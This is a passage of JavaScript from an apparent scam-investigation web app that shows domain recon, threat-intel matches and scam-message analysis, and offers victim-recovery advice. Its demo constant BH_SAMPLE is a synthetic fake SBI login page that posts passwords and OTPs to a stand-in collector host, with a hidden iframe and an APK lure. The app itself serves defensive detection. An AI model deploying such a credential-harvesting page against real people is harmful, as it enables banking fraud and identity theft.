  renderRecon();renderThreats();renderTimeline();renderAI();renderBehaviour();
  if(PAGE_HOOKS.report&&document.body.dataset.page==='report')PAGE_HOOKS.report();
  if(typeof renderChatCtx==='function')renderChatCtx();
}
function renderRecon(){
  const s=state,h=s.h,d=s.dns,i=s.infra,r=s.rdap;if(!h)return;
  $('#rc-domain').textContent=h.host;$('#rc-reg').textContent=h.reg;$('#rc-ip').textContent=i?.ip||d?.A?.[0]||d?.AAAA?.[0]||'—';$('#rc-asn').textContent=i?.asn||'—';
  $('#rc-infra').innerHTML=i?.ok?[kv('IP address',i.ip),kv('ASN',i.asn),kv('Organisation',i.org),kv('ISP',i.isp),kv('Country',i.country),kv('Region / city',[i.region,i.city].filter(Boolean).join(' / ')),kv('Timezone',i.tz),kv('Coordinates',i.lat!=null&&i.lon!=null?i.lat+', '+i.lon:null),kv('Reverse DNS',i.rdns),kv('Data source',i.source)].join(''):`<div class="empty">${esc(i?.skipped||i?.error||(i?.disabled?'IP lookups are switched off in Settings.':'No infrastructure data.'))}</div>`;
  if(d?.ok){
    const rows=[['A',d.A],['AAAA',d.AAAA],['CNAME',d.CNAME],['MX',d.MX],['NS',d.NS],['TXT',d.TXT]].map(([k,v])=>`<tr><td><b>${k}</b></td><td>${v&&v.length?v.map(esc).join('<br>'):'<span style="color:var(--muted)">none returned</span>'}</td></tr>`).join('');
    $('#rc-dns').innerHTML=(d.nx?'<div class="warn" style="margin-bottom:10px">NXDOMAIN — this name does not currently resolve.</div>':'')+'<table class="tbl"><tbody>'+rows+'</tbody></table><div class="sub mt">Source: '+esc(d.provider||'')+(d.skipped?' · '+esc(d.skipped):'')+'. A/AAAA are for the host; MX, NS, TXT are for '+esc(h.reg)+'.</div>';
    $('#rc-mail').innerHTML='<div class="kv" style="grid-template-columns:1fr">'+kv('SPF',d.SPF||'Not published')+kv('DMARC',d.DMARC||'Not published')+kv('DKIM (common selectors only)',d.DKIM?.length?d.DKIM.map(x=>x.sel).join(', ')+' found':'None found among google, selector1, selector2, default, k1')+'</div><div class="note mt">DKIM selectors cannot be enumerated, so “none found” is not proof DKIM is absent. Missing mail policies are weak context only.</div>';
  }else{$('#rc-dns').innerHTML='<div class="empty">'+esc(d?.error||d?.skipped||(d?.disabled?'DNS lookups are switched off in Settings.':'No DNS data.'))+'</div>';$('#rc-mail').innerHTML='<div class="empty">No mail-security data.</div>'}
  if(r?.ok){
    const age=s.ageDays!=null?s.ageDays+' days':null;
    $('#rc-rdap').innerHTML='<div class="kv">'+[kv('Domain created',r.created?fmtDate(r.created):null),kv('Domain age',age),kv('Last updated',r.updated?fmtDate(r.updated):null),kv('Expires',r.expires?fmtDate(r.expires):null),kv('Registrar',r.registrar),kv('Registrar URL',r.registrarUrl),kv('Registrant (public)',r.registrant||'Not public / redacted'),kv('DNSSEC',r.dnssec),kv('Status',(r.status||[]).join(', ')),kv('Nameservers',(r.nameservers||[]).join(', ')),kv('Handle',r.handle),kv('Source',r.source)].join('')+'</div>';
  }else $('#rc-rdap').innerHTML='<div class="empty">'+esc(r?.error||r?.skipped||(r?.disabled?'RDAP lookups are switched off in Settings.':'No registration data.'))+'</div>';
}
const PROVIDERS=[['VirusTotal','Multi-engine URL / domain reputation. Needs a server-side API key.','srv'],['Google Safe Browsing','Browser-vendor threat lists. Needs an API key (server-side preferred).','gsb'],['PhishTank','Community-verified phishing database. Server-side lookup.','srv'],['URLhaus','Malware URL feed from abuse.ch. Server-side lookup.','srv'],['urlscan.io','Historical page scans via the public search API (subject to rate limits).','urlscan'],['Correlation engine','Separates direct matches, related infrastructure, historical and indirect evidence.','local']];
const STATE_LABEL={consulted:['CONSULTED','g'],unavailable:['UNAVAILABLE','a'],disabled:['SWITCHED OFF','m'],'needs-key':['NEEDS KEY','c'],'server-only':['SERVER ONLY','c']};
function renderProviders(){
  const srcs=state.ti?.sources||[];
  $('#providers').innerHTML=PROVIDERS.map(([n,desc,id])=>{
    let st=null;
    if(id==='local')st=['ACTIVE','g'];
    else{const m=srcs.find(x=>x.name===n)||(id==='urlscan'?srcs.find(x=>x.id==='urlscan'):null);if(m)st=STATE_LABEL[m.state];else if(!state.ti)st=['NOT RUN YET','m'];else st=['NOT CONSULTED','m']}
    const det=srcs.find(x=>x.name===n)?.detail;
    return `<div class="card provider"><h3>${esc(n)}${tag(st[0],st[1])}</h3><div class="sub" style="margin:0">${esc(desc)}</div>${det?`<div class="sub" style="color:var(--g);margin:0">${esc(det)}</div>`:''}</div>`}).join('');
}
function renderThreats(){
  renderProviders();
  const s=state,m=s.ti?.matches||[];if(!s.h)return;
  const cls=['DIRECT MATCH','RELATED INFRASTRUCTURE','HISTORICAL OBSERVATION','INDIRECT EVIDENCE'];
  const desc={'DIRECT MATCH':'Exact target reported','RELATED INFRASTRUCTURE':'Associated infrastructure reported','HISTORICAL OBSERVATION':'Previously observed','INDIRECT EVIDENCE':'Related but not sufficient on its own'};
  $('#classSummary').innerHTML='<div class="grid g4">'+cls.map(c=>{const n=m.filter(x=>x.matchType===c).length;return `<div class="kv" style="grid-template-columns:1fr"><div><div class="k">${c}</div><div class="val">${n}</div><div class="sub">${desc[c]}</div></div></div>`}).join('')+'</div>';
  const th=['SOURCE','RESULT','MATCH TYPE','FIRST SEEN','LAST SEEN','CONFIDENCE','REFERENCE','TIMESTAMP'];
  $('#tiTable').innerHTML=m.length?`<table class="tbl"><thead><tr>${th.map(x=>`<th>${x}</th>`).join('')}</tr></thead><tbody>${m.map(x=>`<tr><td><b>${esc(x.source)}</b></td><td>${esc(x.result)}</td><td>${tag(x.matchType,x.matchType==='DIRECT MATCH'?'r':x.matchType==='RELATED INFRASTRUCTURE'?'a':'m')}</td><td>${x.first?esc(fmtDay(x.first)):'—'}</td><td>${x.last?esc(fmtDay(x.last)):'—'}</td><td>${esc(x.confidence)}</td><td>${x.reference?`<a href="${esc(x.reference)}" target="_blank" rel="noopener">open ↗</a>`:'—'}</td><td>${esc(fmtDate(x.ts))}</td></tr>`).join('')}</tbody></table>`:'<div class="empty">No consulted source returned a match. This is not a negative finding about the site — only the listed sources were checked.</div>';
  const th2=['SOURCE','FINDING','TYPE','SEVERITY','FIRST','LAST','CONFIDENCE','RELATIONSHIP','REFERENCE'];
  $('#evMatrix').innerHTML=s.evidence.length?`<table class="tbl"><thead><tr>${th2.map(x=>`<th>${x}</th>`).join('')}</tr></thead><tbody>${s.evidence.map(e=>`<tr><td>${esc(e.source)}</td><td style="min-width:260px">${esc(e.finding)}</td><td>${esc(e.type)}</td><td>${tag(e.severity,e.severity==='High'?'r':e.severity==='Medium'?'a':'m')}</td><td>${e.first?esc(fmtDay(e.first)):'—'}</td><td>${e.last?esc(fmtDay(e.last)):'—'}</td><td>${esc(e.confidence)}</td><td>${esc(e.relationship)}</td><td>${e.reference?`<a href="${esc(e.reference)}" target="_blank" rel="noopener">open ↗</a>`:'—'}</td></tr>`).join('')}</tbody></table>`:'<div class="empty">Run an investigation to correlate evidence.</div>';
}
function renderTimeline(){
  const s=state;if(!s.h)return;
  $('#tlList').innerHTML=s.timeline.map(e=>`<div class="tli ${e.d?'':'unk'}"><div class="t">${esc(e.t)}</div><div class="d">${e.d?esc(fmtDate(e.d)):'No source returned this event'}</div><div class="sub" style="margin:2px 0 0">${esc(e.src)}</div></div>`).join('');
  $('#tlConf').textContent=s.conf+'%';$('#tlBar').style.width=s.conf+'%';
  $('#tlPatterns').innerHTML=s.patterns.length?s.patterns.slice(0,5).map(p=>tag('POSSIBLE: '+p.name,p.hits>=2?'a':'m')).join(''):tag('No pattern established','m');
}
function renderAI(){
  const a=analyst();if(!a)return;
  $('#aiAssess').innerHTML=`<b style="color:var(--white)">${esc(a.verdict)}</b> — risk ${a.score}/100 · confidence ${a.conf}%<br><br>${esc(a.exec)}`;
  $('#aiPatterns').innerHTML=state.patterns.length?state.patterns.slice(0,6).map(p=>tag('POSSIBLE SCAM PATTERN: '+p.name+' · '+strength(p.hits),p.hits>=2?'a':'m')).join(''):tag('No specific pattern established','m');
  $('#aiUnknown').innerHTML=a.unknown.map(x=>'• '+esc(x)).join('<br>');
}
function renderBehaviour(){
  const p=state.page,box=$('#bhOut');if(!p){return}
  const rows=[['Source',p.source],['HTTP status',p.status??'n/a'],['Final URL',p.finalUrl||'—'],['Redirects',p.redirects??'—'],['Title',p.title||'(none)'],['Forms',p.forms],['Password fields',p.passwordFields],['Hidden inputs',p.hiddenInputs],['Iframes (hidden)',p.iframes+' ('+(p.hiddenIframes||0)+')'],['Scripts',p.scripts],['External hosts',p.externalHosts?.length?p.externalHosts.slice(0,8).join(', '):(p.externalHostCount??'—')],['External form destinations',p.externalActions?.length?p.externalActions.join(', '):'none observed'],['Obfuscation / suspicious script patterns',p.obfuscation?.length?p.obfuscation.join(', '):'none observed'],['Downloadable links',p.downloads?.length?p.downloads.join(', '):'none observed'],['Meta refresh redirect',p.metaRefresh?'yes':'no'],['Brand vs domain',p.brandMismatch?('page mentions “'+p.brandMismatch+'”, domain differs'):'no mismatch detected']];
  box.className='';box.innerHTML='<div class="tw"><table class="tbl"><tbody>'+rows.map(r=>`<tr><td><b>${esc(r[0])}</b></td><td>${esc(r[1])}</td></tr>`).join('')+'</tbody></table></div><div class="note mt">Static HTML only. JavaScript-built forms and delayed redirects need a sandboxed browser stage.</div>';
}

/* =====================================================================
   PAGE SOURCE ANALYZER (inert DOMParser), SCAM LAB, CYBERGUARD AI CHAT
   ===================================================================== */
const EXPOSURE=[['name','Name'],['email','Email address'],['phone','Phone number'],['username','Username'],['password','Password'],['otp','OTP'],['bank','Bank details'],['card','Card details'],['upi','UPI / payment information'],['pan','PAN / identity information'],['address','Address'],['doc','Uploaded document'],['file','Downloaded file'],['other','Other']];
const sensitiveRe=[/\b(?:\d[ -]?){12,19}\b/,/\b(otp|pin|cvv|cvc|passcode|password|passwd)\b\s*(is|=|:|-)\s*\S+/i,/\b(my|the)\s+(otp|pin|cvv|password)\s+(is)\b/i,/\b(otp|cvv|pin)\b[^\n]{0,18}\b\d{3,8}\b/i];
const looksSensitive=t=>sensitiveRe.some(r=>r.test(String(t||'')));

function analyzeHtml(src,base){
  const doc=new DOMParser().parseFromString(src,'text/html');   // inert: no scripts run, no resources load
  let bu=null;try{bu=new URL(base)}catch{}
  const bh=bu?bu.hostname.toLowerCase():'',breg=bh?registrable(bh):'';
  const abs=v=>{try{return new URL(v,bu||'https://invalid.invalid/')}catch{return null}};
  const forms=[...doc.querySelectorAll('form')];
  const pw=doc.querySelectorAll('input[type=password]').length;
  const hid=doc.querySelectorAll('input[type=hidden]').length;
  const ifr=[...doc.querySelectorAll('iframe')];
  const hidIfr=ifr.filter(f=>{const st=(f.getAttribute('style')||'').toLowerCase();return /display\s*:\s*none|visibility\s*:\s*hidden/.test(st)||/^0(px)?$/.test(f.getAttribute('width')||'x')||/^0(px)?$/.test(f.getAttribute('height')||'x')}).length;
  const scripts=[...doc.querySelectorAll('script')];
  const hosts=new Set();
  doc.querySelectorAll('[src],[href],[action]').forEach(el=>{const v=el.getAttribute('src')||el.getAttribute('href')||el.getAttribute('action');if(!v||/^(#|javascript:|mailto:|tel:|data:)/i.test(v))return;const u=abs(v);if(u&&/^https?:$/.test(u.protocol)&&u.hostname&&u.hostname!=='invalid.invalid'&&(!bh||registrable(u.hostname.toLowerCase())!==breg))hosts.add(u.hostname.toLowerCase())});
  const extAct=[],insecure=[];
  forms.forEach(f=>{const a=f.getAttribute('action');if(!a)return;const u=abs(a);if(!u||u.hostname==='invalid.invalid')return;if(bh&&registrable(u.hostname.toLowerCase())!==breg)extAct.push(u.hostname);if(u.protocol==='http:'&&f.querySelector('input[type=password]'))insecure.push(a)});
  const code=scripts.map(s=>s.textContent||'').join('\n').slice(0,200000),obf=[];
  if(/eval\s*\(/.test(code))obf.push('eval()');if(/atob\s*\(/.test(code))obf.push('atob() decoding');if(/unescape\s*\(|String\.fromCharCode/.test(code))obf.push('char-code decoding');
  if(/document\.write\s*\(/.test(code))obf.push('document.write');if(/(\\x[0-9a-f]{2}){6,}|(\\u[0-9a-f]{4}){6,}/i.test(code))obf.push('long escape sequences');if(/window\.location(\.href)?\s*=|location\.replace\s*\(/.test(code))obf.push('script-driven redirect');
  const dl=[...doc.querySelectorAll('a[href]')].map(a=>a.getAttribute('href')||'').filter(h=>/\.(apk|exe|msi|scr|zip|rar|vbs|bat|jar|dmg)(\?|$)/i.test(h));
  const meta=!!doc.querySelector('meta[http-equiv="refresh" i]');
  const text=(doc.body?doc.body.textContent:'').replace(/\s+/g,' ').trim().slice(0,8000);
  let bm=null;
  if(bh&&pw>0&&!isTrusted(breg,bh)){const low=((doc.title||'')+' '+text.slice(0,1500)).toLowerCase();for(const b of BRANDS){if(b.length>=5&&low.includes(b)&&!bh.includes(b)){bm=b;break}}}
  return{source:'pasted HTML (parsed inertly in this browser)',status:null,finalUrl:base||null,redirects:null,title:(doc.title||'').trim(),forms:forms.length,passwordFields:pw,hiddenInputs:hid,iframes:ifr.length,hiddenIframes:hidIfr,scripts:scripts.length,externalHosts:[...hosts],externalHostCount:hosts.size,externalActions:[...new Set(extAct)],insecureActions:insecure,obfuscation:obf,downloads:dl,metaRefresh:meta,brandMismatch:bm,text};
}
const BH_SAMPLE='<html><head><title>SBI Net Banking - Secure Login</title><meta http-equiv="refresh" content="900"></head><body><h1>SBI Net Banking</h1><p>Your account is suspended. Verify now to continue.</p>\n<form method="post" action="http://collector.example-evil.test/save.php"><input name="user" placeholder="User ID"><input type="password" name="pw" placeholder="Password"><input type="hidden" name="t" value="x"><input name="otp" placeholder="OTP"><button>Login</button></form>\n<iframe src="https://track.example-evil.test/p" style="display:none" width="0" height="0"></iframe>\n<a href="/update/kyc-helper.apk">Download KYC app</a>\n<script>var s=atob("ZG9jdW1lbnQ="); eval(unescape("%61%6c%65%72%74"));<\/script></body></html>';
function applyPage(p){
  state.page=p;
  if(state.h&&state.done){correlate();renderAll()}else renderBehaviour();
  if(typeof renderChatCtx==='function')renderChatCtx();
}
ACT['bh-run']=()=>{
  const src=$('#bhSrc').value;if(!src.trim()){toast('Paste HTML source or load a file first.');return}
  let base=$('#bhHost').value.trim()||state.h?.url||'';if(base&&!/^https?:/i.test(base))base='https://'+base;
  applyPage(analyzeHtml(src,base));toast('Source analysed. Nothing was executed.');
};
ACT['bh-sample']=()=>{$('#bhSrc').value=BH_SAMPLE;$('#bhHost').value='https://sbi-kyc-update.in.net/netbanking/login';toast('Synthetic demo form loaded — press ANALYZE SOURCE.')};
ACT['bh-remote']=async()=>{
  if(!state.h){toast('Run an investigation first.');return}
  if(!backend.present){toast('No backend detected. Use the safe source analyzer, or connect /api/page-analysis in Settings.');return}
  toast('Requesting server-side page analysis…');const pg=await pageRemote(state.h);
  if(pg&&pg.page)applyPage(normRemotePage(pg));else toast('The server returned no page data.');
};
$('#bhFile').addEventListener('change',e=>{const f=e.target.files[0];if(!f)return;if(f.size>2e6){toast('File too large (2 MB max).');return}const r=new FileReader();r.onload=()=>{$('#bhSrc').value=String(r.result);toast('File loaded as text. Press ANALYZE SOURCE.')};r.readAsText(f)});

/* ---------- Scam Lab ---------- */
const TACTICS=[
 ['Urgency / deadline',/within \d+|immediately|today|urgent|last (chance|warning)|expires?|blocked|suspend|hurry|now or/i],
 ['Authority impersonation',/\b(cbi|police|rbi|income tax|customs|court|officer|bank|sbi|hdfc|icici|government|ministry|trai)\b/i],
 ['Fear / threat',/arrest|legal action|fir\b|penalty|jail|drugs|illegal|blocked|freeze|seiz/i],
 ['Reward / greed',/won|prize|reward|cashback|lottery|earn|profit|guaranteed|bonus|free gift/i],
 ['Secrecy / isolation',/do not tell|don'?t tell|keep (this )?(confidential|secret)|stay on (the )?(call|video)|do not disconnect/i],
 ['Payment or fee demand',/pay|fee|deposit|transfer|send (money|₹|rs)|₹\s?\d|rs\.?\s?\d|upi/i],
 ['Link / app / contact push',/https?:\/\/|www\.|install|download|whatsapp|telegram|click (here|the link)|call (this )?number/i]
];
const SAMPLES={kyc:'SBI ALERT: Your account will be blocked today. Update KYC immediately: http://sbi-kyc-update.in.net/login — SBI Support',parcel:'India Post: Your parcel is held due to an incomplete address. Pay Rs 25 redelivery fee within 12 hours: http://indiapost-redelivery.top/track',job:'Hiring! Work from home, part-time. Earn Rs 5000 per day by liking videos. Registration fee Rs 500. Message us on Telegram to start today.',arrest:'This is CBI officer Sharma. A parcel in your name contains drugs. You are under digital arrest. Do not tell anyone, stay on this video call and transfer money for verification.'};
document.addEventListener('click',e=>{const b=e.target.closest('[data-sample]');if(b){$('#slText').value=SAMPLES[b.dataset.sample]||'';ACT['sl-run']()}});
ACT['sl-clear']=()=>{$('#slText').value='';$('#slOut').className='empty';$('#slOut').textContent='No message analysed yet.'};
ACT['sl-run']=()=>{
  const t=$('#slText').value.trim();if(!t){toast('Paste a message first.');return}
  const out=$('#slOut');
  if(looksSensitive(t)){out.className='';out.innerHTML='<div class="warn">This text looks like it contains an OTP, PIN, CVV, password or card number. Remove it and try again — it is never needed for analysis.</div>';return}
  const tac=TACTICS.filter(x=>x[1].test(t)).map(x=>x[0]);
  const pats=detectScam(t),urls=[...new Set((t.match(/https?:\/\/[^\s<>"']+|www\.[^\s<>"']+/gi)||[]).map(x=>x.replace(/[).,;]+$/,'')))];
  const lvl=tac.length>=4?['STRONG MANIPULATION INDICATORS','r']:tac.length>=2?['SEVERAL MANIPULATION INDICATORS','a']:['FEW INDICATORS','m'];
  out.className='';
  out.innerHTML=`<div>${tag(lvl[0],lvl[1])} <span class="sub">${tac.length} tactic(s) matched</span></div>
  <div class="mt"><div class="ct">Manipulation tactics</div>${tac.length?tac.map(x=>tag(x,'a')).join(''):'<span class="sub">None of the common tactics matched.</span>'}</div>
  <div class="mt"><div class="ct">Possible scam pattern</div>${pats.length?pats.slice(0,5).map(p=>tag('POSSIBLE: '+p.name+' · '+strength(p.hits),p.hits>=2?'a':'m')).join(''):'<span class="sub">No specific pattern established.</span>'}</div>
  <div class="mt"><div class="ct">Links found</div>${urls.length?urls.map(u=>`<div style="margin:4px 0;overflow-wrap:anywhere">${esc(u)} <button class="btn sm" data-fill="${esc(u)}" data-go="investigate">INVESTIGATE</button></div>`).join(''):'<span class="sub">No links in the text.</span>'}</div>
  <div class="note mt">Pattern matching is a heuristic aid, not proof. A real organisation will not ask for OTP, PIN or CVV, threaten arrest by call, or demand fees to release a parcel or prize. Verify through the official app or a number you look up yourself.</div>`;
};

/* ---------- CyberGuard AI chat ---------- */
const QUICK=['Why is this website suspicious?','Has this website been reported?','What information could it steal?','Where is it hosted?','Who owns the domain?','I entered my password.','I entered an OTP.','I entered my card details.','I entered my bank details.','What should I do now?','How do I report this?','What evidence should I save?','Can I trust this website?'];
const chatHist=[];let chatMode='NORMAL',chatBusy=false;
function renderChatCtx(){
  const s=state,el=$('#chatCtx');if(!el)return;
  const m=chatMode==='EMERGENCY'?tag('MODE: EMERGENCY','r'):chatMode==='VICTIM'?tag('MODE: VICTIM PROTECTION','a'):tag('MODE: INVESTIGATION','');
  el.innerHTML=m+(s.h?tag('TARGET '+s.h.host,'c')+(s.score!=null?tag('RISK '+s.score+'/100 · CONF '+s.conf+'%',s.score>=60?'r':s.score>=30?'a':''):''):tag('NO INVESTIGATION LOADED','m'));
}
function typeHTML(el,html,done){
  const tpl=document.createElement('div');tpl.innerHTML=html;el.appendChild(tpl);
  const nodes=[],w=document.createTreeWalker(tpl,NodeFilter.SHOW_TEXT);while(w.nextNode())nodes.push([w.currentNode,w.currentNode.nodeValue]);
  const box=$('#msgs');
  if(reduced){box.scrollTop=box.scrollHeight;done&&done();return}
  nodes.forEach(n=>n[0].nodeValue='');let i=0,pos=0;
  (function tick(){let budget=18;while(budget>0&&i<nodes.length){const[nd,full]=nodes[i],take=Math.min(budget,full.length-pos);pos+=take;nd.nodeValue=full.slice(0,pos);budget-=take;if(pos>=full.length){i++;pos=0}}box.scrollTop=box.scrollHeight;if(i<nodes.length)setTimeout(tick,14);else done&&done()})();
}
function addMsg(role,html,cls=''){const box=$('#msgs'),d=document.createElement('div');d.className='msg '+role+(cls?' '+cls:'');if(html)d.innerHTML=html;box.appendChild(d);box.scrollTop=box.scrollHeight;return d}
function detectIntent(q){
  const s=q.toLowerCase();
  if(/(money|₹|rs\.?|lakh|amount|rupees).{0,40}(stolen|transferred|debited|deducted|lost|sent|gone|taken)|(transferred|sent|paid|lost|deducted|debited).{0,25}(money|₹|rs\.?|amount|rupees)|(account|bank).{0,30}(compromis|hack)|(gave|shared|told|entered|gave away).{0,15}otp.{0,60}(money|debit|deduct|transaction|transfer)|fraud(ulent)? transaction|upi pin.{0,25}(gave|shared|entered)/i.test(s))return'emergency';
  if(/(entered|typed|gave|shared|submitted).{0,20}(my )?(password|login|credential)|password.{0,15}(entered|typed|gave|shared)/.test(s))return'v_password';
  if(/(entered|gave|shared|told|typed).{0,15}(an |the |my )?otp|otp.{0,15}(entered|gave|shared)/.test(s))return'v_otp';
  if(/(entered|gave|shared|typed).{0,25}(card|cvv|debit|credit)/.test(s))return'v_card';
  if(/(entered|gave|shared|typed).{0,25}(bank|netbanking|net banking|account number|ifsc)/.test(s))return'v_bank';
  if(/(entered|gave|shared|typed).{0,25}(upi|pin|payment)/.test(s))return'v_upi';
  if(/(entered|gave|shared|uploaded|sent).{0,25}(aadhaar|aadhar|pan\b|passport|identity|id card|document)/.test(s))return'v_identity';
  if(/what (should|do) i do|what now|next step|i('| a)m scared|help me|i was scammed|i got scammed|i fell for/.test(s))return'whatnow';
  if(/(has|have|is|was|been).{0,25}(reported|flagged|blacklist|listed|known)|reported before/.test(s))return'reported';
  if(/(how|where).{0,25}(report|complain|file)|report (this|it)|complaint|police/.test(s))return'report';
  if(/evidence|screenshot|preserve|proof|save (the|any)/.test(s))return'evidence';
  if(/(host|server|\bip\b|asn|located|which country|isp|hosting)/.test(s))return'hosting';
  if(/(who owns|owner|registrant|registrar|whois|rdap|domain age|how old|created|registered)/.test(s))return'owner';
  if(/(steal|what (info|data)|could (it )?(take|collect|capture)|collect)/.test(s))return'steal';
  if(/(trust|safe\b|legit|genuine|real or fake|can i (use|open|visit))/.test(s))return'trust';
  if(/(scam type|what type|which scam|pattern|category)/.test(s))return'scamtype';
  if(/(dns|\bmx\b|spf|dmarc|nameserver|mail server)/.test(s))return'dns';
  if(/(why|suspicious|risk|score|explain|verdict|summary|summar)/.test(s))return'why';
  if(/^(hi|hello|hey|namaste)\b/.test(s))return'hello';
  return'general';
}
const A=h=>h; // marker: answer HTML is composed from escaped values below
const li=a=>'<ul>'+a.map(x=>'<li>'+x+'</li>').join('')+'</ul>';
const ol=a=>'<ol>'+a.map(x=>'<li>'+x+'</li>').join('')+'</ol>';
const btn=(label,attrs,cls='')=>`<button class="btn sm ${cls}" ${attrs}>${label}</button>`;
const acts=(...x)=>'<div class="row-actions" style="margin-top:10px">'+x.join('')+'</div>';
const CALL=`<a class="btn sm red" href="tel:1930">📞 CALL 1930</a>`,PORTAL=`<a class="btn sm" href="https://www.cybercrime.gov.in/" target="_blank" rel="noopener">REPORT ONLINE ↗</a>`;
const unverified=(what,known,unknown,alt,next)=>`<p><b>I couldn't verify that specific information.</b></p>${known?`<p><b>What is known:</b> ${known}</p>`:''}<p><b>What is unknown:</b> ${unknown}</p>${alt?`<p><b>Alternative:</b> ${alt}</p>`:''}<p><b>Official way to verify:</b> ${what}</p><p><b>Next action:</b> ${next}</p>`;
const needScan=extra=>`<p>I don't have an investigation loaded yet, so I can't answer that from evidence.${extra?' '+extra:''}</p><p>Paste a URL in the Investigate tab and I'll use the results here.</p>${acts(btn('RUN AN INVESTIGATION','data-go="investigate"'))}`;

const PLAN={
  password:{t:'Password exposed',steps:['Open the real service manually (type its address or use its official app) — not the link you were sent.','Change the password right away.','Change the same password anywhere else you reused it.','Turn on two-factor authentication (2FA).','Review active sessions / logged-in devices and sign out of any you don’t recognise.','Review recent security activity and any password-reset or login alerts.','Watch for suspicious login or reset notifications over the next few weeks.']},
  otp:{t:'OTP shared or entered',urgent:true,steps:['If the OTP was for a bank, card or UPI transaction: contact your bank / payment provider NOW through the official number or app and call 1930.','If it was an email OTP: secure the email account first — change its password, check forwarding rules and recovery options.','If it was for WhatsApp / Telegram / Instagram: log in again from the official app, enable two-step verification and remove unknown linked devices.','Do not share any further OTPs, even with someone claiming to be from the bank or police.','Note the time, the service and any messages that followed — it helps the report.']},
  bank:{t:'Bank details exposed',urgent:true,steps:['Contact your bank using an official channel (number on your card / in the bank’s app).','Explain exactly what was exposed and ask what protective action is appropriate (blocks, limits, new credentials).','Monitor transactions closely and turn on transaction alerts.','Preserve evidence (messages, screenshots, transaction records).','Report any unauthorised transaction immediately — call 1930 and report at cybercrime.gov.in.']},
  card:{t:'Card details exposed',urgent:true,steps:['Call the card issuer on the number printed on the card or in its official app and ask them to block or replace the card.','Dispute any transaction you don’t recognise.','Turn on SMS / app alerts for every transaction.','Do not share the replacement card’s OTPs with anyone who calls you.','Keep records and report any loss through 1930 / cybercrime.gov.in.']},
  upi:{t:'UPI / payment information exposed',urgent:true,steps:['Open your UPI app and check recent transactions for anything unfamiliar.','Contact your bank / the UPI app’s in-app support through official channels and ask about blocking or limits.','Change your UPI PIN inside the official app if the PIN may have been exposed.','Remember: you never need to enter a UPI PIN to receive money.','If any money moved, call 1930 immediately and report at cybercrime.gov.in.']},
  pan:{t:'PAN / identity information exposed',steps:['Stop sharing further documents or selfies with the site or caller.','Be alert for loans, SIMs or accounts opened in your name — review your credit report from the credit bureaus.','Use the issuing authority’s official portal / app for any protection options (for example, biometric locking for Aadhaar on the official UIDAI service).','Expect follow-up scams that quote your details — treat any unexpected caller who “knows” your data with suspicion.','Report through 1930 / cybercrime.gov.in and keep a record of what was shared.']},
  doc:{t:'Uploaded document',steps:['Treat everything printed in that document as exposed (ID numbers, address, signature).','Follow the identity-information steps above for each ID type.','Keep a copy of what you uploaded and where — it goes in the complaint.']},
  file:{t:'Downloaded file',steps:['Do not open it again. If you ran or installed it, disconnect the device from the internet.','Run a full scan with a reputable security tool; on Android, remove unknown apps and revoke accessibility / device-admin permissions.','From a different, clean device, change passwords for email, banking and social accounts.','If you can’t be sure it’s clean, consider backing up photos/documents (not apps) and resetting the device.','Tell your bank if banking apps were on that device.']},
  email:{t:'Email address exposed',steps:['Expect more targeted phishing to this address.','Check the mailbox for unfamiliar forwarding rules and sign-ins, and enable 2FA.']},
  phone:{t:'Phone number exposed',steps:['Expect spam calls / SMS. Never share OTPs with callers.','If your phone suddenly loses signal unexpectedly, contact your mobile operator (possible SIM swap).']},
  username:{t:'Username exposed',steps:['Usernames alone are low risk, but check where else you use it and make sure those accounts have unique passwords and 2FA.']},
  name:{t:'Name exposed',steps:['Be cautious with callers who use your name to sound credible — it is easy to obtain.']},
  address:{t:'Address exposed',steps:['Be wary of delivery / courier scams and unexpected visitors or parcels.','Do not pay “redelivery” fees sent by SMS.']},
  other:{t:'Other information',steps:['Write down exactly what you shared and when — describe it in the complaint without including secrets.']}
};
const PLAN_ORDER=['otp','bank','card','upi','password','pan','doc','file','email','phone','username','name','address','other'];
function planFor(keys){return PLAN_ORDER.filter(k=>keys.includes(k)).map(k=>({k,...PLAN[k]}))}
const planHTML=keys=>planFor(keys).map(g=>`<p><b>${esc(g.t)}</b></p>${ol(g.steps.slice(0,6).map(esc))}`).join('');

const ensure={
  async infra(){if(!state.h||state.infra?.ok)return false;if(!cfg.ipintel&&!cfg.doh)return false;if(!state.dns?.ok)state.dns=await dnsRecon(state.h,null);state.infra=await infraRecon(state.h,state.dns,null);return true},
  async rdap(){if(!state.h||state.rdap?.ok)return false;state.rdap=await rdapRecon(state.h,null);return true},
  async ti(){if(!state.h||state.ti)return false;if(!state.dns)state.dns=await dnsRecon(state.h,null);state.ti=await threatRecon(state.h,state.dns);return true}
};
function compactEvidence(){const s=state;return{target:s.h?.url,score:s.score,confidence:s.conf,signals:s.h?.flags?.map(f=>f.title),dns:s.dns?.ok?{A:s.dns.A,MX:s.dns.MX,NS:s.dns.NS,SPF:!!s.dns.SPF,DMARC:!!s.dns.DMARC}:null,infra:s.infra?.ok?{ip:s.infra.ip,asn:s.infra.asn,org:s.infra.org,country:s.infra.country}:null,rdap:s.rdap?.ok?{created:s.rdap.created,registrar:s.rdap.registrar}:null,threat:s.ti?{matches:s.ti.matches,sources:s.ti.sources?.map(x=>x.name+':'+x.state)}:null,page:s.page?{forms:s.page.forms,passwordFields:s.page.passwordFields,externalActions:s.page.externalActions}:null,patterns:s.patterns?.map(p=>p.name)}}

async function localAnswer(intent){
  const s=state,a=analyst();let calls=0,src='current investigation',urgent=false,html='';
  const fresh=async fn=>{try{calls++;await fn();src='fresh lookup + current investigation'}catch{}};
  switch(intent){
    case'emergency':urgent=true;src='built-in emergency protocol';html=`<p><b>Take a breath — there are steps you can take right now.</b> Do these in order:</p>${ol(['<b>Call 1930</b> (National Cyber Crime Helpline) and report at cybercrime.gov.in as soon as possible.','<b>Contact your bank / payment provider</b> through the official number on your card or in their app. Tell them exactly what was shared or sent and ask what protective action they can take.','<b>Secure your accounts</b> — change passwords from a clean device and share no further OTPs.','<b>Preserve evidence</b> — screenshots, messages, phone numbers, transaction IDs / UTR numbers, timestamps.','<b>File the complaint</b> yourself — I can prepare a draft for you to review.'])}${acts(CALL,PORTAL,btn('RECOVERY PLAN','data-go="protection"'),btn('PREPARE COMPLAINT','data-go="complaint"'),btn('NEAREST CYBER POLICE','data-go="help"'))}`;break;
    case'v_password':case'v_otp':case'v_card':case'v_bank':case'v_upi':case'v_identity':{
